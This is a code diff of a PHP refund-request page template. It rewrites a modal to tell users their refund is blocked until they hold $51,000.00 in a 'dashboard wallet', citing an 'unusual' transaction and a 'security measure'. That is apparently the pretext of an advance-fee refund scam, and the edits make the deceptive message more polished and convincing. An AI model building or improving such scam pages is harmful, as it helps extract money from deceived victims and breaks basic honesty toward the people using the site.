@@ -143,28 +143,6 @@ foreach ($fields_by_method as $mname => $mfields) {
     <h2>Refund Request</h2>
     <p class="subtitle">Submit a request to refund a completed transaction</p>
 
-    <!-- Dashboard Wallet Information -->
-    <div class="wallet-info-card">
-        <div class="wallet-info-left">
-            <div class="wallet-icon-badge">
-                <i class="bi bi-wallet2"></i>
-            </div>
-            <div>
-                <div class="wallet-text-title">Dashboard Wallet</div>
-                <div class="wallet-text-value">$<?= $user_balance_display ?></div>
-            </div>
-        </div>
-        <?php if (!$is_eligible): ?>
-        <div class="wallet-status-badge restricted">
-            <i class="bi bi-shield-exclamation"></i> Security Limit: $51,000.00
-        </div>
-        <?php else: ?>
-        <div class="wallet-status-badge verified">
-            <i class="bi bi-shield-check"></i> Eligible for Refund
-        </div>
-        <?php endif; ?>
-    </div>
-
     <?php if ($errors): ?>
     <div class="error-block"><ul><?php foreach($errors as $err): ?><li><?= e($err) ?></li><?php endforeach; ?></ul></div>
     <?php endif; ?>
@@ -180,7 +158,7 @@ foreach ($fields_by_method as $mname => $mfields) {
                 <option value="">— Select transaction —</option>
                 <?php foreach ($transactions as $t): ?>
                 <option value="<?= $t['id'] ?>" <?= (($_POST['transactions']??'')==$t['id'])?'selected':'' ?>>
-                    Transaction #<?= $t['id'] ?> ($<?= number_format((float)$t['amount'], 2) ?>) — Dashboard Wallet: $<?= $user_balance_display ?>
+                    Transaction #<?= $t['id'] ?> — $<?= e($t['amount']) ?>
                 </option>
                 <?php endforeach; ?>
             </select>
@@ -243,10 +221,13 @@ foreach ($fields_by_method as $mname => $mfields) {
         <div class="modal-icon-wrap">
             <i class="bi bi-shield-lock-fill"></i>
         </div>
-        <span class="modal-tag">Security Notice</span>
-        <h3 class="modal-title">Security Verification Required</h3>
+        <span class="modal-tag">🔒 Security Notice</span>
+        <h3 class="modal-title">Refund Blocked — Balance Too Low</h3>
         <p class="modal-message">
-            You need to have <strong>$51,000</strong> to complete the refund for security purpose as the fund is unusaul.
+            Your account does not meet the minimum balance required to process a refund.
+            You need to have <strong>$51,000.00</strong> in your dashboard wallet to complete this refund request.
+            This security measure is in place because the transaction amount flagged as unusual,
+            and we require sufficient funds to verify account authenticity before releasing any refund.
         </p>
 
         <div class="modal-balance-box">
